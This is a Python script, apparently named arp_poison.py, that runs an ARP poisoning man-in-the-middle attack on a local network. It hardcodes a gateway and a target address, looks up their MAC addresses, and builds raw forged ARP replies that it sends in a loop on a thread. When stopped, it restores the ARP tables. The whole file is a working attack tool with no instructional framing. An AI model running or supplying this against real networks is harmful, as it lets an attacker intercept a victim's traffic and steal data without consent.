from scapy.all import *
import os
import signal
import sys
import threading
import time
import socket
import binascii
import fcntl
import netifaces as ni
import struct
from uuid import getnode

#ARP Poison parameters
from scapy.layers.l2 import ARP

gateway_ip_str = "192.168.0.1"
target_ip_str = "192.168.0.104"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0


def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])


def scapy_get_mac(ip_address):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None


def send_arp_packet(dest_ip, dest_mac, target_ip, local_mac):
    raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    raw.bind(('eth0', socket.htons(0x0800)))

    # Ethernet Header
    protocol = 0x0806  # 0x0806 protocol to ARP
    ethernet_header = struct.pack("!6s6sH", dest_mac, local_mac, protocol)

    # ARP header

    type_hardware = 1
    type_protocol = 0x0800  # IPV4
    size_addr_hardware = 6
    size_addr_protocol = 4
    operation = 2

    arp_addr = struct.pack("!HHBBH6s4s6s4s", type_hardware, type_protocol,
                           size_addr_hardware, size_addr_protocol, operation,
                           local_mac, target_ip, dest_mac, dest_ip)
    packet = ethernet_header + arp_addr

    raw.send(packet)


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    os.kill(os.getpid(), signal.SIGTERM)


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, local_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send_arp_packet(gateway_ip, gateway_mac, target_ip, local_mac)
            send_arp_packet(target_ip, target_mac, gateway_ip, local_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


# Start the script
print("[*] Starting script: arp_poison.py")
print(f"[*] Local IP address: {ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']}")
print(f"[*] Gateway IP address: {gateway_ip_str}")
print(f"[*] Target IP address: {target_ip_str} \n")


gateway_ip = socket.inet_aton(gateway_ip_str)
target_ip = socket.inet_aton(target_ip_str)

gateway_mac = binascii.unhexlify(scapy_get_mac(gateway_ip_str).replace(':', ''))
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)


target_mac = binascii.unhexlify(scapy_get_mac(target_ip_str).replace(':', ''))
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)


local_mac = binascii.unhexlify(getHwAddr('eth0').replace(':', ''))
local_ip = socket.inet_aton(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])

print(f"[*] Local IP binary address: {local_ip}")
print(f"[*] Gateway IP binary address: {gateway_ip}")
print(f"[*] Target IP binary address: {target_ip} \n")

print(f"[*] Local MAC address: {getHwAddr('eth0')}")
print(f"[*] Gateway MAC address: {scapy_get_mac(gateway_ip_str)}")
print(f"[*] Target MAC address: {scapy_get_mac(target_ip_str)} \n")

print(f"[*] Local MAC binary address: {local_mac}")
print(f"[*] Gateway MAC binary address: {gateway_mac}")
print(f"[*] Target MAC binary address: {target_mac} \n")

# send_arp_packet(1, gateway_ip, gateway_mac, local_ip, local_mac)

# ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, local_mac))
poison_thread.start()
